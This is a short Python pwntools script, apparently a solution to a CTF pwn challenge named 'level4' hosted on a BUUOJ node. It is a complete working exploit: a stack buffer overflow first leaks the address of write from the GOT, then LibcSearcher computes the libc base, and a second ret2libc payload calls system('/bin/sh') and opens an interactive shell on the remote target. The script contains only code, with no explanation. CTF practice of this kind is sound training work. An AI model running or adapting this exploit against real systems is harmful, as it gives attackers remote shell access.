from pwn import *
from LibcSearcher import *
context(log_level='debug', arch='i386', os='linux')

if len(sys.argv) > 1:
  conn = remote('node4.buuoj.cn', 27723)
else:
  conn = process(sys.argv[0][:-7])

elf = ELF('./level4')
write_plt = elf.plt['write']
write_got = elf.got['write']
vuln = 0x0804844b

payload = cyclic(0x88+4) + p32(write_plt) + p32(vuln) + p32(0x1) +  p32(write_got) + p32(0x4) 
conn.sendline(payload)
leak_addr = u32(conn.recv(4))
libc = LibcSearcher('write', leak_addr)
libc_base = leak_addr - libc.dump('write')
system = libc_base + libc.dump('system')
binsh = libc_base + libc.dump('str_bin_sh')

payload2 = cyclic(0x88 + 4) + p32(system) + p32(0) + p32(binsh)
conn.sendline(payload2)
conn.interactive()


